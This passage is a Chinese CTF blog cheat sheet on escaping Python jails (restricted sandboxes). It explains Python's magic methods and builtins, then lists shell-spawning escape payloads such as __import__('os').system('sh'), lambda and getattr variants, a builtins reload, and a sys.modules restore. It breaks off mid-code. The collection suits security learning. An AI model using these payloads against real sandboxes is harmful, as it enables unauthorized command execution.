@@ -1,0 +1,756 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title>PyJail姿势总结 - Sc0fie1d</title><meta name="Description" content="scofield&#39;s blog"><meta property="og:title" content="PyJail姿势总结" />
+<meta property="og:description" content="对PyJail姿势的总结" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://scofield1920.github.io/pyjail_summury/" /><meta property="og:image" content="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-10-14T00:00:00+08:00" />
+<meta property="article:modified_time" content="2024-10-14T00:00:00+08:00" /><meta property="og:site_name" content="Hugo DoIt Theme Documentation" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico" /><meta name="twitter:title" content="PyJail姿势总结"/>
+<meta name="twitter:description" content="对PyJail姿势的总结"/>
+<meta name="application-name" content="scofield-blog">
+<meta name="apple-mobile-web-app-title" content="scofield-blog">
+
+<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="http://scofield1920.github.io/pyjail_summury/" /><link rel="prev" href="http://scofield1920.github.io/hnctf_pyjail/" />
+<link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><meta name="google-site-verification" content="MQ8DNu27ayX6B_4ObiEDK09vGr1fdy7kOAnbd09hJk4" /><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "PyJail姿势总结",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/scofield1920.github.io\/pyjail_summury\/"
+        },"image": ["http:\/\/scofield1920.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "misc, manual","wordcount":  554 ,
+        "url": "http:\/\/scofield1920.github.io\/pyjail_summury\/","datePublished": "2024-10-14T00:00:00+08:00","dateModified": "2024-10-14T00:00:00+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": {
+                    "@type": "ImageObject",
+                    "url": "http:\/\/scofield1920.github.io\/images\/avatar.webp",
+                    "width":  528 ,
+                    "height":  560 
+                }},"author": {
+                "@type": "Person",
+                "name": "Sc0fie1d"
+            },"description": ""
+    }
+    </script><script src="//instant.page/5.2.0" defer type="module" integrity="sha384-jnZyxPjiipYXnSU0ygqeac2q7CVYMbh84q0uHVRRxEtvFPiQYbXWUorga2aqZJ0z"></script>
+</head>
+
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme;   window.isDark = window.theme !== 'light' }
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('auto' === 'light' || 'auto' === 'dark' || 'auto' === 'black') setTheme('auto'), saveTheme('auto'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+        window.switchThemeEventSet = new Set()
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Sc0fie1d"><span class="header-title-pre"><i class='far fa-edit fa-fw'></i></span><span id="desktop-header-typeit" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/links/"> Links </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="https://github.com/scofield1920" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                    <select class="color-theme-select" id="theme-select-desktop" title="Switch Theme">
+                        <option value="light">Light</option>
+                        <option value="dark">Dark</option>
+                        <option value="black">Black</option>
+                        <option value="auto">Auto</option>
+                    </select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Sc0fie1d"><span class="header-title-pre"><i class='far fa-edit fa-fw'></i></span><span id="mobile-header-typeit" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/links/" title="">Links</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="https://github.com/scofield1920" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+                <select class="color-theme-select" id="theme-select-mobile" title="Switch Theme">
+                    <option value="light">Light</option>
+                    <option value="dark">Dark</option>
+                    <option value="black">Black</option>
+                    <option value="auto">Auto</option>
+                </select>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><div class="toc" id="toc-auto">
+        <h2 class="toc-title">Contents</h2>
+        <div class="toc-content" id="toc-content-auto"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#魔术方法">魔术方法</a></li>
+        <li><a href="#魔术属性">魔术属性：</a></li>
+        <li><a href="#内置函数和变量">内置函数和变量：</a></li>
+        <li><a href="#模块">模块</a></li>
+        <li><a href="#lambda表达式">lambda表达式</a></li>
+        <li><a href="#reload-重新加载">reload 重新加载</a></li>
+        <li><a href="#恢复-sysmodules">恢复 sys.modules</a></li>
+        <li><a href="#rce_payload">rce_payload</a></li>
+        <li><a href="#bypass">bypass</a></li>
+        <li><a href="#pyjail一般思路">pyjail一般思路</a></li>
+        <li><a href="#参考文档">参考文档</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+    </div><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">PyJail姿势总结</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="/" title="Author" rel=" author" class="author">Sc0fie1d</a>
+                </span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">categories <a href="/categories/misc/"><i class="far fa-folder fa-fw"></i>Misc</a>&nbsp;<a href="/categories/manual/"><i class="far fa-folder fa-fw"></i>Manual</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2024-10-14">2024-10-14</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2024-10-14">2024-10-14</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;554 words&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;3 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#魔术方法">魔术方法</a></li>
+        <li><a href="#魔术属性">魔术属性：</a></li>
+        <li><a href="#内置函数和变量">内置函数和变量：</a></li>
+        <li><a href="#模块">模块</a></li>
+        <li><a href="#lambda表达式">lambda表达式</a></li>
+        <li><a href="#reload-重新加载">reload 重新加载</a></li>
+        <li><a href="#恢复-sysmodules">恢复 sys.modules</a></li>
+        <li><a href="#rce_payload">rce_payload</a></li>
+        <li><a href="#bypass">bypass</a></li>
+        <li><a href="#pyjail一般思路">pyjail一般思路</a></li>
+        <li><a href="#参考文档">参考文档</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>对PyJail姿势的总结</p>
+<ul>
+<li>在python中，类均继承自<code>object</code>基类；</li>
+<li>python中类本身具有一些静态方法，如<code>bytes.fromhex</code>、<code>int.from_bytes</code>等。</li>
+</ul>
+<h3 id="魔术方法" class="headerLink">
+    <a href="#%e9%ad%94%e6%9c%af%e6%96%b9%e6%b3%95" class="header-mark"></a>魔术方法</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">__init__：构造函数。
+</span></span><span class="line"><span class="cl">__len__：返回对象的长度。对一个对象a使用len(a)时，会尝试调用a.__len__()。
+</span></span><span class="line"><span class="cl">__str__：返回对象的字符串表示。对一个对象a使用str(a)时，会尝试调用a.__str__()。
+</span></span><span class="line"><span class="cl">__getitem__：根据索引返回对象的某个元素。对一个对象a使用a[1]时，会尝试调用a.__getitem__(1)。
+</span></span><span class="line"><span class="cl">__add__、__sub__、__mul__、__div__、__mod__：算术运算，加减乘除模。如对一个对象a使用a+b时，会尝试调用a.__add__(b)。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">__and__，__or__、__xor__：逻辑运算，和算术运算类似；
+</span></span><span class="line"><span class="cl">__eq__，__ne__、__lt__、__gt__、__le__、__ge__：比较运算，和算术运算类似；例如&#39;贵州&#39; &gt; &#39;广西&#39;，就会转而调用&#39;贵州&#39;.__gt__(&#39;广西&#39;)；
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">__getattr__：对象是否含有某属性。如果我们对对象a所对应的类实现了该方法，那么在调用未实现的a.b时，就会转而调用a.__getattr__(b)。这也等价于用函数的方法调用：getattr(a, &#39;b&#39;)。有__getattr__，自然也有对应的__setattr__；
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">__subclasses__：返回当前类的所有子类。一般是用在object类中，在object.__subclasses__()中，我们可以找到os模块中的类，然后再找到os，并且执行os.system，实现RCE。
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="魔术属性" class="headerLink">
+    <a href="#%e9%ad%94%e6%9c%af%e5%b1%9e%e6%80%a7" class="header-mark"></a>魔术属性：</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">__dict__：可以查看内部所有属性名和属性值组成的字典。
+</span></span><span class="line"><span class="cl">__doc__：类的帮助文档。默认类均有帮助文档。对于自定义的类，需要我们自己实现。
+</span></span><span class="line"><span class="cl">常用__doc__属性来取字符
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">__class__：返回当前对象所属的类。如&#39;&#39;.__class__会返回&lt;class &#39;str&#39;&gt;。拿到类之后，就可以通过构造函数生成新的对象，如&#39;&#39;.__class__(4396)，就等价于str(4396)，即&#39;4396&#39;；
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">__base__：返回当前类的基类。如str.__base__会返回&lt;class &#39;object&#39;&gt;；
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="内置函数和变量" class="headerLink">
+    <a href="#%e5%86%85%e7%bd%ae%e5%87%bd%e6%95%b0%e5%92%8c%e5%8f%98%e9%87%8f" class="header-mark"></a>内置函数和变量：</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">dir：查看对象的所有属性和方法。
+</span></span><span class="line"><span class="cl">chr、ord：字符与ASCII码转换函数，可以绕WAF
+</span></span><span class="line"><span class="cl">globals：返回所有全局变量的函数；
+</span></span><span class="line"><span class="cl">locals：返回所有局部变量的函数；
+</span></span><span class="line"><span class="cl">__import__：载入模块的函数。import os等价于os = __import__(&#39;os&#39;)；
+</span></span><span class="line"><span class="cl">__name__：该变量指示当前运行环境位于哪个模块中。
+</span></span><span class="line"><span class="cl">__builtins__：包含当前运行环境中默认的所有函数与类。
+</span></span><span class="line"><span class="cl">__file__：该变量指示当前运行代码所在路径。open(__file__).read()就是读取当前运行的python文件代码。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">_：该变量返回上一次运行的python语句结果。
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="模块" class="headerLink">
+    <a href="#%e6%a8%a1%e5%9d%97" class="header-mark"></a>模块</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1">#os</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;dir&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;dir&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#platform</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">platform</span>
+</span></span><span class="line"><span class="cl"><span class="n">platform</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;dir&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">platform</span><span class="o">.</span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;dir&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#timeit</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">timeit</span>
+</span></span><span class="line"><span class="cl"><span class="n">timeit</span><span class="o">.</span><span class="n">timeit</span><span class="p">(</span><span class="s2">&#34;__import__(&#39;os&#39;).system(&#39;dir&#39;)&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#sys</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">modules</span>
+</span></span><span class="line"><span class="cl"><span class="n">modules</span><span class="p">[</span><span class="s1">&#39;os&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;sh&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">modules</span><span class="p">[</span><span class="s1">&#39;posix&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;sh&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">sys</span><span class="o">.</span><span class="n">_getframe</span><span class="p">()</span><span class="o">.</span><span class="n">f_locals</span><span class="o">.</span><span class="n">values</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="lambda表达式" class="headerLink">
+    <a href="#lambda%e8%a1%a8%e8%be%be%e5%bc%8f" class="header-mark"></a>lambda表达式</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;sh&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">__builtins__</span><span class="o">.</span><span class="vm">__dict__</span><span class="p">[</span><span class="s1">&#39;__import__&#39;</span><span class="p">](</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;sh&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="k">lambda</span><span class="p">:</span> <span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;sh&#39;</span><span class="p">))()</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">__builtins__</span><span class="o">:=</span><span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">))</span><span class="ow">and</span><span class="p">(</span><span class="k">lambda</span><span class="p">:</span><span class="n">system</span><span class="p">)()(</span><span class="s1">&#39;sh&#39;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="reload-重新加载" class="headerLink">
+    <a href="#reload-%e9%87%8d%e6%96%b0%e5%8a%a0%e8%bd%bd" class="header-mark"></a>reload 重新加载</h3><p>重新加载模块，绕过删除模块或方法</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">__builtins__</span><span class="o">.</span><span class="vm">__dict__</span><span class="p">[</span><span class="s1">&#39;eval&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">built</span><span class="o">-</span><span class="ow">in</span> <span class="n">function</span> <span class="nb">eval</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="k">del</span> <span class="n">__builtins__</span><span class="o">.</span><span class="vm">__dict__</span><span class="p">[</span><span class="s1">&#39;eval&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">__builtins__</span><span class="o">.</span><span class="vm">__dict__</span><span class="p">[</span><span class="s1">&#39;eval&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">Traceback</span> <span class="p">(</span><span class="n">most</span> <span class="n">recent</span> <span class="n">call</span> <span class="n">last</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">  <span class="n">File</span> <span class="s2">&#34;&lt;stdin&gt;&#34;</span><span class="p">,</span> <span class="n">line</span> <span class="mi">1</span><span class="p">,</span> <span class="ow">in</span> <span class="o">&lt;</span><span class="n">module</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="ne">KeyError</span><span class="p">:</span> <span class="s1">&#39;eval&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">reload</span><span class="p">(</span><span class="n">__builtins__</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">module</span> <span class="s1">&#39;__builtin__&#39;</span> <span class="p">(</span><span class="n">built</span><span class="o">-</span><span class="ow">in</span><span class="p">)</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">__builtins__</span><span class="o">.</span><span class="vm">__dict__</span><span class="p">[</span><span class="s1">&#39;eval&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">built</span><span class="o">-</span><span class="ow">in</span> <span class="n">function</span> <span class="nb">eval</span><span class="o">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在 Python 3 中，reload() 函数被移动到 importlib 模块中，所以如果要使用 reload() 函数，需要先导入 importlib 模块。</p>
+<h3 id="恢复-sysmodules" class="headerLink">
+    <a href="#%e6%81%a2%e5%a4%8d-sysmodules" class="header-mark"></a>恢复 sys.modules</h3><p>一些过滤中可能将 <code>sys.modules['os']</code> 进行修改. 这个时候即使将 os 模块导入进来,也是无法使用的.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">sys</span><span class="o">.</span><span class="n">modules</span><span class="p">[</span><span class="s1">&#39;os&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;not allowed&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">del</span> <span class="n">sys</span><span class="o">.</span><span class="n">modules</span><span class="p">[</span><span class="s1">&#39;os&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;ls&#39;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="rce_payload" class="headerLink">
+    <a href="#rce_payload" class="header-mark"></a>rce_payload</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1">#起手式</span>
+</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;sh&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;ls&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#属性/字典</span>
+</span></span><span class="line"><span class="cl"><span class="nb">getattr</span><span class="p">(</span><span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">),</span><span class="s1">&#39;system&#39;</span><span class="p">)(</span><span class="s1">&#39;dir&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="fm">__getattribute__</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">)(</span><span class="s1">&#39;dir&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="vm">__dict__</span><span class="o">.</span><span class="fm">__getitem__</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">)(</span><span class="s1">&#39;dir&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#os._wrap_close类</span>
